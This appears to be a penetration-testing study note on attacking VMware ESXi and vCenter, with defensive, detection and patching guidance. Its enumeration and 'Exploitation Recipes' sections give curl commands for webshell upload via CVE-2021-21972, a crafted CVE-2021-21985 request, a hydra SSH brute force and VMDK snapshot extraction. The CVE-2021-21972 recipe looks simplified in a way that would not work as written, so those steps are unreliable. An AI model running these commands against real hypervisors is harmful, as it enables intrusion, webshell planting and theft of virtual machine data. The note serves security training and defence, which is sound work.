# ESXi and vSphere Attacks

## 1. Overview

VMware ESXi is a Type 1 hypervisor, and vCenter Server is the management plane for ESXi hosts. Together they form the vSphere platform, widely used in enterprise data centers and private clouds.

Attack surface:

- **ESXi host:** web UI (443), SOAP API (902), CIM (5988/5989), SSH (22), SMB (445), NTP (123).
- **vCenter Server:** web UI (443), SSO (443), vAPI (443), vROPS plugin (443), Syslog (514).
- **Management network:** usually a dedicated VLAN, but often misconfigured.

Common attack paths:

1. Default or weak credentials on ESXi root or vCenter SSO.
2. Unpatched CVEs in vCenter (CVE-2021-21972, CVE-2021-21985, CVE-2023-34048).
3. vCenter SSRF to internal services.
4. Snapshot abuse for data exfiltration.
5. Virtual network sniffing (promiscuous mode).

## 2. Reconnaissance / Enumeration

### Offensive

```bash
# Port scan
nmap -p 22,80,443,445,902,5988,5989,8000,8080,8443 -sV <target>

# ESXi version via web UI
curl -k -s https://<target>/ | grep -i "version\|build"

# vCenter version via API
curl -k -s https://<target>/sdk/vimServiceVersions.xml | grep -i "version"

# Check for vROPS plugin (CVE-2021-21972 indicator)
curl -k -s -o /dev/null -w "%{http_code}" https://<target>/ui/vropspluginui/rest/services/getstatus
```

### Defensive

- Restrict management ports to a dedicated VLAN.
- Disable SSH and ESXi Shell unless actively used.
- Monitor for scans against 443, 902, 5988, 5989 on hypervisor subnets.

## 3. Common Attack Vectors

- **Default credentials:** ESXi root with no password, vCenter `administrator@vsphere.local` with weak password.
- **CVE-2021-21972:** vCenter vROPS plugin unauthenticated RCE (CVSS 9.8).
- **CVE-2021-21985:** vCenter vSAN plugin unauthenticated RCE (CVSS 9.8).
- **CVE-2023-34048:** vCenter DCERPC out-of-bounds write (CVSS 9.8).
- **Snapshot abuse:** create a snapshot, download the VMDK, mount it locally.
- **Virtual network sniffing:** promiscuous mode on a vSwitch.

## 4. Exploitation Recipes

### CVE-2021-21972 (vCenter vROPS RCE)

```bash
# Check vulnerability
curl -k -s -o /dev/null -w "%{http_code}" https://<target>/ui/vropspluginui/rest/services/getstatus

# Upload a JSP webshell (path traversal)
curl -k -X POST https://<target>/ui/vropspluginui/rest/services/uploadova \
  -F "uploadFile=@shell.jsp"

# Trigger the shell
curl -k https://<target>/ui/vropspluginui/rest/services/shell.jsp?cmd=id
```

### CVE-2021-21985 (vCenter vSAN RCE)

```bash
# Send a crafted request to the vSAN health check endpoint
curl -k -X POST "https://<target>/ui/h5-vsan/rest/proxy/service/&vsanQueryUtil_setDataService/setTargetObject" \
  -H "Content-Type: application/json" \
  -d '{"methodInput":[{"type":"ClusterComputeResource","value":null,"serverGuid":null}]}'
```

### ESXi default credentials

```bash
# Try root with no password
ssh root@<target>

# Brute-force SSH (if enabled)
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target>
```

### Snapshot extraction

```bash
# List VMs and snapshots (requires ESXi shell access)
vim-cmd vmsvc/getallvms
vim-cmd vmsvc/snapshot.get <vmid>

# Download the VMDK via datastore browser
# Then mount locally:
guestmount -a snapshot.vmdk -i /mnt/vm
```

## 5. Post-Exploitation

- **Datastore access:** ESXi datastores contain VMDK files. Mounting a VMDK gives access to the guest filesystem.
- **vCenter SSO database:** contains hashed credentials for all vCenter users.
- **Virtual network pivoting:** from a compromised VM, enable promiscuous mode to sniff traffic on the virtual switch.
- **Snapshot exfiltration:** download snapshots of sensitive VMs.

## 6. Preventive Controls (Defensive)

- **Patch management:** apply VMware security advisories within 48 hours for critical CVEs.
- **Network segmentation:** management interfaces on a dedicated VLAN, never exposed to the internet.
- **MFA:** enable multi-factor authentication for vCenter SSO and ESXi SSH.
- **Least privilege:** no daily use of `root`. Create named accounts with minimum role.
- **Disable unused services:** CIM, SMB, SSH, ESXi Shell.
- **Certificate management:** replace default self-signed certificates.

## 7. Detection Controls (Defensive)

- **vCenter audit logs:** monitor `com.vmware.vapi` events, especially `UploadOva`, `SetTargetObject`, `Login`.
- **ESXi shell logs:** `/var/log/shell.log`, `/var/log/hostd.log`.
- **Network IDS:** alert on scans against 443, 902, 5988, 5989 on hypervisor subnets.
- **SIEM correlation:** successful login from a new IP to vCenter followed by a VM snapshot creation.

## 8. Verification

- `nmap -p 443,902,5988,5989 <target>` from an untrusted network should show filtered/closed.
- `esxcli network firewall ruleset list` on ESXi: only required services allowed.
- vCenter SSO MFA enforced: `vSphere Client -> Administration -> Single Sign On -> Configuration`.
- Review `/var/log/vmware/vpxd/vpxd.log` for failed login attempts.

## 9. OSCP Notes

- OSCP exam scope does not include hypervisor exploitation directly. However, a compromised hypervisor can be a pivot point to multiple VMs.
- Screenshot the ESXi version and successful login.
- Document the exact CVE and patch level.

## 10. Production Notes

- **Change management:** hypervisor patches require a maintenance window. Test in a lab first.
- **Backup:** vCenter configuration backups (`vdcbackup`) encrypted and stored offline.
- **Monitoring:** integrate vCenter events into SIEM. Alert on `UploadOva` and `SetTargetObject`.
- **Incident response:** if a hypervisor is compromised, assume all VMs on that host are compromised. Isolate, snapshot for forensics, rebuild.

## 11. References

- VMware Security Advisories - https://www.vmware.com/security/advisories
- CVE-2021-21972 NVD - https://nvd.nist.gov/vuln/detail/CVE-2021-21972
- CVE-2021-21985 NVD - https://nvd.nist.gov/vuln/detail/CVE-2021-21985
- CVE-2023-34048 NVD - https://nvd.nist.gov/vuln/detail/CVE-2023-34048
- NIST SP 800-125 - https://csrc.nist.gov/publications/detail/sp/800-125/final
